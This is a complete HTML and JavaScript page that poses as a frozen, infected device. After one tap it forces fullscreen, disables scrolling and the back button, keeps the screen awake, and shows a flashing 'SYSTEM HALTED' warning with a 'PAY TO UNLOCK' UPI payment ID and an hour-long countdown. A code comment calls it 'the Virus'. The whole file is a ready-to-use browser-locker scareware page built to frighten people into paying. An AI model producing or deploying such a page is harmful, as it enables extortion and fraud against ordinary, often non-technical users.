<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Freeze</title>
    <style>
        /* Force Fullscreen & No Scroll */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; /* Prevents scrolling/swiping */
            background-color: #000;
            font-family: 'Courier New', Courier, monospace;
            user-select: none; /* Prevents text selection */
            -webkit-user-select: none;
        }

        /* The "Frozen" Screen Overlay */
        #freeze-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        /* Glitch Text Effect */
        .glitch {
            font-size: 2.5rem;
            font-weight: bold;
            color: #ff0000;
            text-transform: uppercase;
            position: relative;
            animation: glitch-anim 0.3s infinite;
            margin-bottom: 10px;
        }

        @keyframes glitch-anim {
            0% { transform: translate(0) }
            20% { transform: translate(-2px, 2px) }
            40% { transform: translate(-2px, -2px) }
            60% { transform: translate(2px, 2px) }
            80% { transform: translate(2px, -2px) }
            100% { transform: translate(0) }
        }

        /* UPI Box Styling */
        .upi-container {
            background: rgba(30, 30, 30, 0.9);
            border: 2px solid #ff0000;
            padding: 20px;
            border-radius: 15px;
            width: 80%;
            max-width: 300px;
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
            margin: 20px 0;
        }

        .upi-label {
            color: #ccc;
            font-size: 1rem;
            margin-bottom: 5px;
        }

        .upi-id {
            color: #fff;
            font-size: 2rem;
            font-weight: bold;
            letter-spacing: 1px;
        }

        /* Timer Styling */
        .timer-display {
            font-size: 4rem;
            color: #00ffcc;
            margin-top: 20px;
            font-weight: bold;
        }

        .status-msg {
            color: #888;
            font-size: 1.2rem;
            margin-top: 10px;
        }

        /* Start Overlay */
        #start-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            cursor: pointer;
        }

        /* Hidden Class */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- Click to Start -->
    <div id="start-overlay">
        <h1>TAP TO FREEZE SYSTEM</h1>
    </div>

    <!-- The Frozen Screen -->
    <div id="freeze-screen" class="hidden">
        <div class="glitch">SYSTEM HALTED</div>
        
        <div class="upi-container">
            <div class="upi-label">PAY TO UNLOCK</div>
            <div class="upi-id">51club@axl</div>
        </div>

        <div class="status-msg">FUNCTIONS DISABLED</div>
        <div class="timer-display" id="countdown">60:00</div>
    </div>

    <script>
        // Configuration
        const upiID = "51club@axl";
        let timeLeft = 60 * 60; // 1 hour in seconds (3600)

        const startOverlay = document.getElementById('start-overlay');
        const freezeScreen = document.getElementById('freeze-screen');
        const countdownEl = document.getElementById('countdown');

        // Function to enter Fullscreen
        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(err => {
                    console.log(`Error: ${err.message}`);
                });
            }
        }

        // Start the "Virus" on click
        startOverlay.addEventListener('click', () => {
            startOverlay.classList.add('hidden');
            freezeScreen.classList.remove('hidden');
            
            // Enter Fullscreen
            toggleFullScreen();

            // Prevent Swipe/Scroll visually
            document.body.addEventListener('touchmove', preventDefault, { passive: false });
            document.body.addEventListener('wheel', preventDefault);

            // Start Timer
            startTimer();
        });

        // Prevent Default Scroll/Swipe Behavior
        function preventDefault(e) {
            e.preventDefault();
        }

        // Disable Back Button (Android)
        window.onpopstate = function(event) {
            history.pushState(null, null, location.href);
        };
        
        // Initial push to history stack
        history.pushState(null, null, location.href);

        // Timer Logic
        function startTimer() {
            const timerInterval = setInterval(() => {
                let minutes = Math.floor(timeLeft / 60);
                let seconds = timeLeft % 60;

                // Add leading zeros
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                countdownEl.textContent = `${minutes}:${seconds}`;

                if (timeLeft === 0) {
                    clearInterval(timerInterval);
                    document.querySelector('.glitch').textContent = "SYSTEM RESTORED";
                    document.querySelector('.status-msg').textContent = "Tap to exit.";
                    countdownEl.style.color = "#00ff00"; // Green
                    
                    // Optional: Exit fullscreen after 2 seconds of restored message
                    setTimeout(() => {
                        if (document.fullscreenElement) {
                            document.exitFullscreen();
                        }
                    }, 2000);
                } else {
                    timeLeft--;
                }
            }, 1000);
        }

        // Keep screen awake (Wake Lock API)
        async function keepAwake() {
            try {
                if ('wakeLock' in navigator) {
                    await navigator.wakeLock.request('screen');
                }
            } catch (err) {
                console.log(`${err.name}, ${err.message}`);
            }
        }
        
        // Call wake lock after start
        setTimeout(keepAwake, 1000);

    </script>
</body>
</html>
